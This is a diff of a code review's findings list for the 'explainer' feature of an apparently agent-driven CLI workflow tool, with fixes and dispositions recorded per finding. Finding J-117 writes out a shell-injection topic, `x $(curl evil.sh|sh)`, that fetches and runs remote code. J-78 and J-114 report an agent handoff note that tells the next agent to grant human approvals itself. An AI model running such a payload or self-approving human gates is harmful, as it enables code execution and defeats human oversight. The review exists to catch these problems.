+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-74 AC-34 has no passing evidence
 - situation (cli): no passing test proves AC-34: test_ac34_same_topic didn't run
@@ -586,6 +654,7 @@ outcome: rerun
 - situation (adversary): after approval someone adds `Read first: [explainer.md](explainer.md)` plus a blank line in the middle of quickstart.md, or moves it into a code sample. `planned` strips the first occurrence wherever it sits, so the judged blob is unchanged and the edit is never detected. The same line with CRLF endings, or as the last line with no blank line after it, is not stripped. Then `finish`'s own edit counts as a plan edit and sends the flow back, which is the thing CT-9 exists to prevent.
 - fix: don't commit HANDOFF.md, or strip the self-approval instruction and point to the human's current message as the only authority.
 - validation: confirmed: HANDOFF.md line 10-11 tells the next agent to run `--by human` approvals itself, which conflicts with the flow rule that only the human gives `--human`. It is untracked today, not committed, but the pack lists it as part of the PR.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-79 Topic-path ACs 18, 19 and 35 have no passing evidence
 - quote: "Fix: land T-14's topic-mode e2e tests as regression guards (T-14 retired, already delivered by T-8)"
@@ -604,6 +673,7 @@ outcome: rerun
 - quote: "once approved, a frozen task can't drop a retired dependency; scheduling skips it as met"
 - situation (conformance): the diff edits `src/nio/tasks.py` and `src/nio/implement.py`, which change how tasks are checked and scheduled for every effort, and adds `HANDOFF.md` at the repo root. The explainer spec and contracts ask for neither. The change has its own tests (`test_retired_dependency_after_approval_is_met`, `test_retired_dependency_is_met`), but nothing in the spec requests it, and FR-17 keeps the flow unchanged.
 - fix: split it into its own PR or issue, and drop HANDOFF.md before merging.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-82 TC-5 names a test that does not hold the CLI assertions
 - quote: "- File: `tests/test_explain.py:test_ac5_node_cap` (new)"
@@ -615,11 +685,14 @@ outcome: rerun
 - quote: "or, when `explain.format` isn't `mermaid`, anywhere in that section's text"
 - situation (consistency): `explain.format` is `svg` and the component map section has a note line `> CT-3 is drawn in the note` (the section has a `![` image line and the walk otherwise names CT-1 and CT-2). The diff's label source is `cm["walk"] + (cm["block"] or "")`, and `sections()` removes `> ` and `![` lines from `walk`. CT-3 is reported as `component map misses CT-3` although the section text names it, which CT-4 says must count.
 - fix: take the non-mermaid source from the section's full text (the raw lines between its heading and the next `## `), not from `walk` plus `block`.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-84 Contract list is read with `spec.items`, not the `implement.defs` the spec names
 - quote: "for each `### CT-n` in contracts.md (`implement.defs`) not named in the component map's node labels"
 - situation (consistency): CT-4 names `implement.defs` as the source of the `### CT-n` list. The diff builds the list with `spec.items(<raw lines of contracts.md>)` and takes `c.startswith("CT-")`. `implement.defs` runs `records.parse` first, which strips the front matter, and returns a dict. Both give the same IDs for today's contracts.md, but a front-matter line that looks like a definition would be read differently here, and a reader following CT-4 would look in the wrong function.
+- situation (consistency): a reader who follows CT-4 looks in implement.defs, which runs records.parse (it strips the front matter) and returns a dict. The code gives spec.items the raw lines, front matter included. For today's contracts.md the two give the same IDs. They differ only if a front-matter line looks like a `### CT-n` heading, and in that case the code would require coverage of an ID that is not a contract.
 - fix: call `implement.defs(p.parent / "contracts.md")` and iterate its keys, or change CT-4 to name `spec.items` and say that the raw lines are used.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-85 The drill-downs record is one line per heading, not the line the contract names
 - quote: "the drill-downs line: `(drill-downs: <heading>; <heading>)`, the drill-down headings after the last finish, marker left out (the human, Q15)"
@@ -628,6 +701,7 @@ outcome: rerun
 - situation (consistency): a plan explainer with two drill-down sections, `## Drill-down: one` and `## Drill-down: two`, is finished. The file gets `(drill-down: Drill-down: one)` and `(drill-down: Drill-down: two)` lines. A reader or check that follows CT-5 looks for one `(drill-downs: …)` line and finds none, so the "drill-downs line" the contract describes is never written. The format change (the T-25 and T-29 fixes) is sound, but it departs from the approved contract without a change request.
 - fix: write a change request that amends the record shape in contracts.md, or keep the one-line form and escape the separator. Either way the contract and `finish` must say the same thing.
 - validation: confirmed: contracts.md line 137 and CT-5 step 7 specify one `(drill-downs: a; b)` line. explain.py:277 writes one `(drill-down: <title>)` line per heading, and no change request amends the contract. REC reads both, but the contract and the code differ.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-86 Step 6 renders SVGs and deletes files before the step that the contract says keeps everything in memory
 - quote: "Returns, doing in this order, all in memory until step 8:"
@@ -635,6 +709,7 @@ outcome: rerun
 - quote: "`f.unlink()`"
 - situation (consistency): the diff's `finish` writes each SVG to disk through `render(block, d / name)` and deletes listed images through `f.unlink()`, both before `_put(p, …)` in step 8. A run that renders three SVGs and then stops (for example, the renderer hangs after the first) has written files that the contract says stay in memory until step 8. The contract's later sentence ("a run stopped before step 8 leaves explainer.md as it was") does allow this, so the impact is limited to the wording, but the two statements do not agree.
 - fix: change the opening sentence of CT-5 to say which steps touch disk before step 8 (renders and deletions), or move the deletions and renders after the write.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-87 Image names are built with a different slug rule from the one CT-5 points to
 - quote: "(the title without the marker, named by CT-6's rule without the 40-character cut)"
@@ -642,12 +717,15 @@ outcome: rerun
 - quote: "`base = p.stem + "--" + "-".join(re.sub(r"[^a-z0-9 ]", "", re.sub(r"[-/_]", " ", title.lower())).split())`"
 - situation (consistency): a section titled `## Flow: UJ-2 refund's path` gets `explainer--flow-uj-2-refunds-path.svg` from the code, because the apostrophe is deleted rather than turned into a dash. CT-6's rule gives `explainer--flow-uj-2-refund-s-path.svg`. Any reader that follows CT-5 by name finds a different file. Titles with `.`, `'`, `,` or `(` in the middle hit the same divergence.
 - fix: implement the CT-6 rule as written (`re.sub(r"[^a-z0-9]+", "-", …).strip("-")`) and let the test for CT-5 step 6 check one title with punctuation inside it.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-88 The drawing loop renders a later Mermaid block in a section whose first block is another language
 - quote: "`fence` is the language of the section's first fenced block (`mermaid` for a Mermaid block)"
 - quote: "`elif first and title and lang == "mermaid":`"
 - situation (consistency): a section `## Calls` holds a ```text block and then a ```mermaid block. CT-1 says the section's `fence` is `text`, so it is not a Mermaid diagram section. In the diff, `first` is only cleared when a Mermaid block closes, so the loop renders the second block, writes `explainer--calls.svg`, and adds an image line under the section. The check (CT-4) would not count this section as a diagram section. I have not run this case; it follows from reading the loop.
+- situation (integration): `finish` walks the body line by line three times, each with its own fence toggle and `## ` heading test (the diagrams-hash loop at explain.py:220-231, the image-link strip at 241-255, the render planner at 257-275), next to `sections()` (explain.py:19-45), which parses the same headings and fences. The copies already differ: `sections()` takes a section's first block only, while the hash loop takes every fenced block. A later change to what counts as a section or a block has to be made in four places.
 - fix: clear `first` after the first fenced block of any language, so only the first block of a section can be drawn.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-89 Re-run keeps the old diagrams, but AC-32 says they are redrawn
 - quote: "then the diagrams are redrawn and the drill-down section is still in the file, marked as written for an earlier plan."
@@ -663,22 +741,26 @@ outcome: rerun
 - situation (consistency): CT-9's shape removes the first line of quickstart.md when it is exactly the Read-first line. The code removes the first place in the file where that line and a blank line appear, wherever that is. A quickstart that quotes the same line mid-file loses it, and that edit is then not counted as an edit to the plan. Rare in practice, but it is not the rule CT-9 states.
 - situation (correctness): CT-9 says `planned` drops "the first line that is exactly `Read first: [explainer.md](explainer.md)`". The code does a substring replace of the first match anywhere in the file, and it needs a following blank line. A line such as `see Read first: [explainer.md](explainer.md)` followed by a blank line is partly stripped. A copy of the line placed mid-document is dropped from the judged text, so that edit to the plan goes unnoticed. A CRLF file, or a line with no blank line after it, is not stripped, so the gate blocks on it. The AC-23 test only tries the line at the top of the file, so it would not catch any of these.
 - fix: name quickstart.md in the docstring.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-91 The artefact docstring says the planned read is for the tasks gate only
 - quote: "At the tasks gate, tasks.md as"
 - situation (consistency): the docstring says `planned` applies at the tasks gate only. The diff changes the code to `text = lambda p: planned(p.name, p.read_text())`, so every gate's files now go through `planned`. A later reader following the docstring would expect plan-gate quickstart.md to be read raw, and that is no longer true.
 - fix: say that every gate's files are read through `planned`.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-92 The planned docstring says other files are read as they are
 - quote: "tasks.md without its `#### Fixes` sections, any other file as it is."
 - situation (consistency): the docstring says any file other than tasks.md is returned as it is. The function now strips the `Read first` line from quickstart.md, so that statement is false for quickstart.md.
 - fix: add the quickstart.md `Read first` case to the docstring.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-93 Suggestion wording is narrower in AC-24 than in CT-8
 - quote: "Given the plan gate has just closed as approved"
 - quote: "when the stage is `tasking`, `tasks_jury` or `implementing`"
 - situation (consistency): the plan gate is approved and the effort is at `tasks_jury`. AC-24 reads as a one-time suggestion right after the plan gate closes. CT-8 and the code print the `suggest:` line on every `nio flow next` run in those three stages until explainer.md exists, and no test covers a later run.
 - fix: say in AC-24 whether the suggestion repeats across tasking, tasks_jury and implementing, or add a test for the later stages if the repeat is intended.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-94 T-30 says the topic behaviour exists, but the topic CLI is a stub in this commit
 - quote: "T-14 retired, already delivered by T-8"
@@ -694,17 +776,20 @@ outcome: rerun
 - quote: "Mode: single: unit test on explain.topic, then the fix"
 - situation (consistency): T-42 is removed and T-39 takes its Files line and AC-34. T-39 still says "From: J-9" only. J-18, the finding T-42 came from, now has no task that names it, so a later fix-check can't tie J-18 to a fix task. T-39's Mode also changes to a single-worker unit test, with no note that it now covers a second finding.
 - fix: either keep T-42 with its "From: J-18" line, or add J-18 to T-39's From line and say in the task which finding it closes.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-96 A retired dependency counts as met, so T-15 can start before T-14's work is done
 - quote: "# a retired dependency is met"
 - situation (consistency): implement.py now drops a retired ID from a task's Depends on list, so T-15 (Depends on: T-14 in .nio/specs/2026-11-08-explainer/tasks.md) is ready right away. T-14's topic-mode regression tests are only landed by T-30, which is a separate direct task that is not yet done. T-15's drill-down work is meant to follow topic mode (CT-12), so a worker can start on it before the topic behaviour it builds on is guarded.
 - fix: keep the retired-dependency rule, but have T-15 depend on T-30 (the task that now carries T-14's guards) instead of on the retired ID.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-97 The format note never appears in topic mode
 - quote: "`render skipped: diagrams drawn with <format>` when `explain.format` is set and isn't `mermaid`"
 - quote: "fmt = records.config(root).get("explain", {}).get("format", "mermaid")"
 - situation (correctness): `explain.format` is read only inside `if plan_mode:`, so `nio check explainer <topic path>` with a host format never prints the note CT-4 describes without a mode restriction.
 - fix: read `fmt` before the plan-mode branch and drop the `plan_mode and` guard on the note, or narrow CT-4's note to plan mode.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-98 Mermaid failures other than a parse error are reported as broken
 - quote: "`"unreachable"` for any other failure, `FileNotFoundError` and `subprocess.TimeoutExpired` included."
@@ -713,6 +798,7 @@ outcome: rerun
 - situation (consistency): CT-3 says only a non-zero exit with `Parse error` in its output is `broken`, and any other failure is `unreachable`. The diff returns `broken: <first line>` for every non-zero exit that does not match the COULD_NOT_RUN markers. So a renderer that crashes with an unlisted error (for example `EACCES` or an out-of-memory message) makes `nio check explainer` print `broken diagram: <title>` for a diagram that is fine, and it is treated as an error, not as a skipped render. The test `test_ac9_broken_block` pins the widened rule with the `UnknownDiagramError` case, so the suite passes while the contract says `unreachable`.
 - fix: either narrow `render` back to CT-3 (broken only with `Parse error`), or write a change request against CT-3 first if a typo'd diagram type (`UnknownDiagramError`) should count as broken. Then change the test to match whichever rule is chosen. Until then the code and CT-3 disagree.
 - validation: confirmed: CT-3 (contracts.md) says `broken` only for a non-zero exit with `Parse error` in its output and `unreachable` for any other failure. explain.py render (lines 84-88) returns `broken: <first line>` for every non-zero exit that doesn't match the COULD_NOT_RUN markers, falling back to lines[0] when there is no `Parse error` line.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-99 CT-2 wording drops a node named `endpoint`, the code keeps it
 - quote: "`subgraph` or `end` are skipped"
@@ -721,6 +807,7 @@ outcome: rerun
 - situation (consistency): read literally, CT-2 skips every line that starts with `end`. A diagram line `endpoint --> api` would then drop `endpoint` from the count, and the 20-node cap of AC-5 undercounts. A 21-node diagram with one such node name passes `nio check explainer`. The code (and the test that asserts `{"endpoint", "api"}`) keeps the node, so the spec text and the code disagree about the rule the cap depends on.
 - fix: change CT-2 to say the line is skipped only when it is `end` on its own (or starts with `end ` as the code does), and say that in the spec; the code's behaviour is the one the test already expects. This is a spec change, so write the change request for it.
 - validation: confirmed: CT-2 says lines "starting `subgraph` or `end`" are skipped, with no trailing space or whole-line qualifier, unlike `class ` and `style `. A literal reading drops `endpoint --> api`. explain.py line 53 skips only `end` alone or `end ` followed by more text, so the spec text and the code disagree.
+- disposition: accepted-risk by human: Known: Mermaid node counting and CT-2/CT-3 wording lag the deliberate T-17/T-18/T-19 code; tracked in #127
 
 ### J-100 CLI help names the arguments differently from CT-5, CT-6 and CT-10
 - quote: "`explain finish <slug>` and `explain topic <path>`"
@@ -728,43 +815,51 @@ outcome: rerun
 - quote: "nio explain topic "<text>""
 - situation (consistency): the `explain` help in cli.py says `finish <slug>` and `topic <path>`. CT-5 gives `nio explain finish <path>`, CT-6 gives `nio explain topic "<text>"`, and CT-10 gives `finish <path>` and `topic <text>`. A user reading `nio --help` is told to pass a slug to finish and a path to topic, which is the reverse of what the topic command takes (the topic text).
 - fix: change the help string to `finish <path>` and `topic <text>` to match CT-5, CT-6 and CT-10. The argument name `target` can stay.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-101 render reports "broken" for failures CT-3 calls unreachable
 - quote: "for any other failure"
 - quote: "`lines[0] if lines else "exit %d" % r.returncode`"
 - situation (conformance): mermaid-cli exits non-zero without `Parse error` and without one of the COULD_NOT_RUN markers, for example an `UnknownDiagramError` or an unlisted launch failure. CT-3 says the result is `unreachable`, a skipped render with a note. The code returns `broken: <first stderr line>`, so `nio check explainer` fails with `broken diagram`. The test `test_ac9_broken_block` asserts this new behaviour for a diagram-type typo. An unlisted environment failure would also fail the check, which FR-11 says only a diagram that fails to render may do.
 - fix: either change CT-3 to say `broken` covers any non-zero exit that is not a known fetch or launch failure (the code is right, since a mistyped diagram type is a real broken diagram), or restore the `Parse error` rule. Keep the two aligned.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-102 tasks.py fix-ID change is outside the explainer spec
 - quote: "a fix task already committed took its ID before later retirements"
 - situation (conformance): the E-1 diff changes `tasks.check_fixes` and adds `test_a_committed_fix_task_survives_a_later_retired_fix_id` in tests/test_tasks.py. No contract or FR of the explainer covers a change to the tasks check. It changes how every effort's fix-task IDs are checked, so it should be reviewed on its own.
 - fix: say in the PR that this is a separate fix (or move it to its own commit), or record the contract that covers it.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-103 AC-5 check half has no result in the evidence list
 - quote: "`nio check explainer` SHALL fail naming any diagram over 20"
 - situation (conformance): the Results list holds only `test_ac5_node_cap` for AC-5, and it tests `nodes()`, not the check. The E-1 `check` never emits `too many nodes`. `test_ac5_node_cap_check` passes in the suite output but has no entry in Results, so the CLI half of AC-5 has no recorded result.
 - fix: record `test_ac5_node_cap_check` in the evidence, or confirm the later epic that adds the `too many nodes` error owns the CLI half of AC-5.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-104 render reports `broken` where CT-3 says `unreachable`
 - quote: "`"unreachable"` for any other failure"
 - situation (conformance): a non-zero exit with no `Parse error` and no marker, for example an unknown-diagram-type error or an unexpected crash, returns `broken: <first line>` in the code. CT-3 returns `unreachable` for it, and `check` then adds no error. `test_ac9_broken_block` pins the code's behaviour with `UnknownDiagramError` giving `broken`. The code is arguably the better rule, since a typo in the diagram type is a broken diagram, but it differs from the contract.
 - fix: update CT-3 to say a non-zero exit with no fetch or launch marker is broken (`right: code`), or restore the contract rule and drop the typo case from the test.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-105 Unrequested `check_fixes` change in E-1
 - quote: "a fix task already committed took its ID before later retirements"
 - situation (conformance): E-1 also edits `tasks.py check_fixes` (committed fix tasks keep their ID) and adds `test_a_committed_fix_task_survives_a_later_retired_fix_id`. No E-1 AC, FR or CT asks for this. It looks like a workaround for the flow's own fix-task numbering, and it changes behaviour for every effort.
 - fix: confirm the change is intended and covered by its own spec. If not, move it to its own issue.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-106 Offer check passes on any text that contains the three words
 - quote: "all(k in low for k in ("component", "flow", "decision"))"
 - situation (correctness): the agent writes an overview that mentions "component", "flow" and "decision", for example a git-hooks explainer, and then never makes the three offers. `offers(out)` still passes, so AC-15 and AC-16 are not shown to hold. The same weak check also guards the offers after a pick.
 - fix: assert the three labels as offer labels. For example, require lines that start with or hold `component:`, `flow:` and `decision:` followed by a named item. Or check the reply against the three-item shape that SKILL.md prescribes.
 - validation: confirmed: tests/test_explain_e2e.py lines 255-257 define `offers(out)` as a bare substring test for "component", "flow" and "decision" in the lowercased reply. test_ac15_three_offers (line 264) and test_ac16_pick_appends (line 272) both rely on it. Any overview that mentions those words passes without the three offers being made, and nothing else in the tests checks the offer shape.
+- disposition: accepted-risk by human: J-23: topic() only names a path, concurrent runs out of scope; J-106: offer test is a keyword heuristic by design
 
 ### J-107 Stop test checks only wording in the last line, not that nothing is offered
 - quote: "assert not re.search(r"(?i)\b(want|would you like|pick|zoom into)\b", out.strip().splitlines()[-1]), out"
 - situation (correctness): after `stop`, the agent re-lists the three offers (`component`, `flow`, `decision`) in the middle of the final message and ends on a plain sentence such as "Done." The test passes because only the last line is scanned for four words. The AC says no offer in the final message.
 - fix: scan the whole final reply for the offer labels, the same way `offers` reads them. Assert that none appear after the last `## Drill-down:` was written.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-108 `finish` and the plan gate disagree on where the `Read first` line sits, so explaining a plan changes its judged quickstart
 - quote: "a quickstart.md without that line reads exactly as before, so a version judged before this change still compares equal" (CT-9)"
@@ -773,16 +868,19 @@ outcome: rerun
 - situation (integration): `explain.finish` builds `"---\n{fm}---\n" + "\n" + line + "\n\n" + rest.lstrip("\n")`, and `jury.planned("quickstart.md", …)` removes only `line + "\n\n"`, leaving `"---\n{fm}---\n\n# Quickstart…"`. Every real quickstart under .nio/specs/ (all 15) has the title directly under `---`, so the planned text gains a blank line. `flow.scan` then sees `current != judged` for quickstart.md and sends the effort back to the plan gate after any plan-mode explain run. The tests miss it because the `fin_repo` fixture has a blank line after the front matter, and TC-30 inserts the line before the front matter by hand instead of running `finish`.
 - fix: make the two sides one format in one place: have `finish` insert exactly `Read first: [explainer.md](explainer.md)\n\n` immediately after the front matter (or at byte 0 when there is none), without the leading `\n` and without `lstrip`, so `planned`'s single replace is its exact inverse; and change the TC-30 / TC for AC-4 fixtures to a template-shaped quickstart (front matter then `# Quickstart` with no blank line) that runs `finish` and then asserts `jury.planned` returns the original text.
 - validation: confirmed: explain.py:174 writes `---\n{fm}---\n` + `\n` + line + `\n\n` + `rest.lstrip("\n")`, while jury.py:215 removes only `line\n\n`. The planned text keeps an extra blank line against a quickstart whose title sits directly under `---`. The spec's own quickstart.md does (lines 4-5). The blob then differs, so flow.scan reports a change.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-109 CLI help, a docstring and the README row are out of step with what the diff ships
 - quote: "A new `explain` group with `finish <path>` and `topic <text>`" (CT-10)"
 - situation (integration): `cli.py` registers `explain` with help "`explain finish <slug>` and `explain topic <text>`", but `finish` takes a path (the skill passes `<path>`; a slug fails to resolve); `check`'s help still reads "`check spec|plan <slug>`" with no explainer; `explain.check`'s docstring says "Only the missing-file error so far" though it runs every CT-4 check; README.md's row says "🚧 plan mode built" though topic mode and the drill-down are in this diff.
 - fix: change the help to `explain finish <path>` and add `explainer` to `check`'s help, drop "Only the missing-file error so far" from the docstring, and update the README row's status to cover plan mode, topic mode and the drill-down.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-110 The staleness test and the fence/heading walk are written twice in explain.py
 - quote: "`walk` is the section's text without fenced blocks" (CT-1)"
 - situation (integration): `finish` (step 3) and `stale` each parse `(source: f@h)` with `REC` and compare `implement.digest(root, f)[:12] != h`; if one changes (e.g. a gone file's handling) the stale line in `nio status` and the drill-down marker can disagree. `finish` also re-walks fences and `## ` headings by hand three times (the diagrams hash, the image strip, the render plan) beside `sections()`, which already yields titles, fences and blocks; and the plan-mode test `p == spec.path(...).parent / "explainer.md"` is repeated in `check` and `finish`.
 - fix: add one helper `_sources_changed(root, recs)` used by both `finish` and `stale`, and one `_plan_mode(root, p)` used by `check` and `finish`; build the diagrams hash from `sections()` blocks of non-drill sections instead of a fourth fence loop.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-111 `finish`'s Read-first line doesn't strip back on real quickstarts, so the plan gate reopens
 - quote: "a quickstart.md without that line reads exactly as before" (CT-9)"
@@ -796,35 +894,42 @@ outcome: rerun
 - quote: "Shape: `nio explain finish <path>`" (CT-5)"
 - situation (integration): a user follows the help and runs `nio explain finish checkout-refunds`. `finish` resolves `root/checkout-refunds` and calls `p.read_text()`, which raises FileNotFoundError. The CLI catches only ValueError, so the user gets a traceback, not `error: …`.
 - fix: change the help to `explain finish <path>`, and in `finish` raise `ValueError(f"no explainer at {path}")` when `p` is not a file.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-113 README row still says only plan mode is built
 - quote: "| [`@nio:explain`](skills/explain/SKILL.md) | 🚧 plan mode built | Explains an approved plan …"
 - situation (integration): the effort ships topic mode (CT-6), drill-down (CT-12) and format (CT-13), and the skill documents all three. The README row says only plan mode is built and describes only plan mode.
 - fix: mark the row built, and say it also explains any topic and offers drill-downs.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-114 HANDOFF.md, a session handoff note, is committed in the effort diff
 - quote: "The human said (2026-11-08): "I give you full autonomy to run these I approve all your future commands…""
 - situation (integration): commit c2a4486, "WIP from paused explainer session", added a 72-line agent handoff at the repo root. It serves no FR, AC or CT, it will go to main with the PR, and it records a standing authority grant as repo content.
 - fix: remove HANDOFF.md from the branch (`git rm`), and keep handoffs out of the tree or ignored.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-115 Most acceptance tests for the skill never ran
 - quote: "Given a spec whose plan gate is still open, when plan mode is asked for it, then no explainer.md is written and the reply says the plan jury comes first and offers topic mode."
 - situation (adversary): the pack's results show `test_ac1_core_diagrams`, `test_ac2_flows_and_state`, `test_ac3_no_state_table`, `test_ac30_refused_open_gate`, `test_ac32_rerun_keeps_drill` and `test_ac12`/`13`/`14` as "didn't run". The skill is the only thing that stops plan mode on an unapproved plan. A broken refusal step would write an explainer for an unapproved plan, and nothing in the diff would show it. The hints also list the misuse tests (`test_uj1_*`, `test_uj3_topic_not_plan`) as not run.
 - situation (adversary): the Results list the e2e tests for refusal on an open gate, a re-run keeping drill-downs, and the SVG, broken and no-Node cases as "didn't run". The suite prints them as `ok` because they are skipped. If the skill sent an agent to write explainer.md before the plan gate is approved, or dropped a drill-down on a re-run, nothing in this diff would fail. Silent success is the failure mode here. A skipped test is counted as `ok`, and the skill is prose that no unit test can pin beyond headings.
+- situation (conformance): the PR suite ran without NIO_E2E, so the tests for AC-1, AC-2, AC-3, AC-12, AC-13, AC-14, AC-30 and AC-32 are all recorded "didn't run". The render step of `finish` (SVG files per block, a broken block flagged, text-only notes) and plan-mode refusal are therefore unproven at the PR gate, though the code looks right on reading.
 - fix: run the e2e suite (`NIO_E2E=1`) before the verdict, or record these ACs as unverified.
 - validation: confirmed: tests/test_explain_e2e.py gates the skill's behaviour tests behind NIO_E2E=1 (docstring: "Without NIO_E2E they print `skipped` and pass"), and the pack records them as not run. The skill's refusal and re-run steps are therefore unverified in this diff, and CLAUDE.md says to run the e2e after a card or skill change.
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-116 Plan gate ignores the "Read first" line anywhere in quickstart.md, not only the first line
 - quote: "without the first line that is exactly"
 - situation (adversary): someone edits an approved quickstart.md and puts `Read first: [explainer.md](explainer.md)` plus a blank line in the middle of the file, or glued to the end of another line (`see belowRead first: [explainer.md](explainer.md)` followed by a blank line). `str.replace(..., 1)` removes that text wherever it sits. The edit is then compared as unchanged, so the approval stands although the approved plan file changed. The reverse also happens. A legitimate line that `finish` wrote with no blank line after it, for example at the end of the file, is not stripped. It then reads as an edit and blocks the flow, which AC-23 forbids. The test only checks the line prepended at the top.
 - fix: strip only a line that is the first line of the file (anchor with `startswith` or `^...$` with `re.M` at position 0) and add a test for the mid-file and glued cases
 - validation: confirmed: src/nio/jury.py planned() does `text.replace("Read first: [explainer.md](explainer.md)\n\n", "", 1)` on quickstart.md. That strips the first occurrence anywhere in the file, not only at the start, so a mid-file or glued copy is treated as the finish-added line and an approved-plan edit is masked.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-117 Topic text goes into a shell command inside double quotes
 - quote: "nio explain topic"
 - situation (adversary): the human, or text pasted from an untrusted page, gives the topic `x $(curl evil.sh|sh)` or one with a backtick or a `"`. The agent builds `nio explain topic "x $(curl evil.sh|sh)"`, and the shell expands it before `nio` runs. A topic with an embedded `"` also breaks the argument, so a different topic is recorded in the `(topic: ...)` line. Neither the skill nor CT-11 says to pass the topic through safely.
 - fix: tell the skill to pass the topic in single quotes with embedded `'` escaped, or on stdin or a file, and to refuse a topic holding a newline
 - validation: confirmed: skills/explain/SKILL.md line 58 tells the agent to run `nio explain topic "<topic>"` in double quotes. Nothing says to escape `$`, backticks or `"`, so shell expansion of pasted text is possible.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-118 The behaviour the skill promises is proven by no test that ran
 - quote: "then no explainer.md is written and the reply says the plan jury comes first"
@@ -836,11 +941,105 @@ outcome: rerun
 - quote: "the sections of CT-12 and CT-13"
 - situation (adversary): SKILL.md has no `## Drill-down` and no `## Format` section. An agent then has no instruction to offer three items, to read `explain.format`, or to fall back to Mermaid and say so. Meanwhile it holds `## Non-goals (for now)` and `## Success looks like`, copied from the project vision. They are not a skill's inputs or outputs, and they tell an agent about plans and budgets it shouldn't act on. If E-4 deliberately defers CT-12 and CT-13 to a later epic, the README row says "plan mode built" but the skill still has no marker.
 - fix: remove the two unrelated sections and either add the Drill-down and Format sections or state in the skill that they come later
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-120 A CRLF quickstart.md gets the Read-first line above its front matter
+- quote: "the first line of quickstart.md's body is "Read first: explainer.md""
+- situation (adversary): quickstart.md was saved with CRLF line endings (the repo already treats these as possible: `judged_blob` says "line endings never read as an edit"). `read_first` tests `text.startswith("---\n")`, which is false for `---\r\n`. `_front` then returns `("", text)` and no `ValueError` is raised. `finish` prepends `Read first: [explainer.md](explainer.md)` to the very top of the file, above the `---\r\n` front matter. The front matter is no longer first, so any reader of it silently loses it. `finish` still prints `finished:`, and the plan gate sees nothing wrong because `unread_first` strips the line again.
+- fix: detect front matter by `startswith(("---\n", "---\r\n"))`, or refuse like the unclosed case; add a CRLF case to the quickstart test (T-26 covered only the unclosed-front-matter case).
+- validation: confirmed: explain.py:159 and 166 test only `startswith("---\n")`; for `---\r\n` `_front` returns ("", text), no ValueError is raised, and `read_first` puts the Read-first line above the front matter. Nothing else in the spec or code settles it, and AC-4 wants the line first in the body.
+- disposition: accepted-risk by human: J-38: CT-2 wording lag, #127. J-120: CRLF fix ready, lands in a follow-up PR
+
+### J-121 The 20-node cap is bypassed by `:::` classes and by diagram types with no arrows
+- quote: "a node being a distinct node ID in the diagram block"
+- quote: "that is an endpoint of an arrow"
+- situation (adversary): `nodes()` does `line.split(":")[0]` before it splits on arrows. A Mermaid class shorthand such as `A:::hot --> B:::hot --> C:::hot --> ...` therefore yields only `A`. A 40-node chain written that way counts as 1 node, `check explainer` exits 0, and the oversized diagram ships. Diagram types with no arrow endpoints (class diagrams `Animal <|-- Duck`, ER `A ||--o{ B`, mindmap, gantt) are also under-counted, because only `-->`-style arrows and `participant`/`state` lines are recognised. Nothing fails or warns, so the rule meant to keep diagrams readable silently stops applying.
+- fix: strip `:::\w+` before the colon split, and either count class/ER relation arrows or fail the check on a block whose type `nodes()` can't count.
+- validation: merged: same as J-2
+
+### J-122 One timing-out block turns off the check for every block after it, and the check exits 0
+- quote: "after which no further block is rendered"
+- quote: "then it fails naming that block as a broken diagram"
+- situation (adversary): a block that hangs the renderer (a pathological or very large diagram) hits `TIMEOUT = 120`, and `TimeoutExpired` is mapped to `"unreachable"`. `check` then notes "the renderer could not be fetched" and `break`s, so every later block, including ones with real syntax errors, is never validated. The exit is still 0. `finish` does the same with `halt = True`. It writes `> Images not rendered: the renderer could not be fetched.` and skips the remaining images, though the network was fine and the cause was one bad block. Nothing counts blocks or total time either: N blocks can each burn 120 s before the first `halt`.
+- fix: treat a timeout as a failure of that block (`broken: timed out`) and keep going; keep `halt` for Node-missing and fetch failures only; cap the total time.
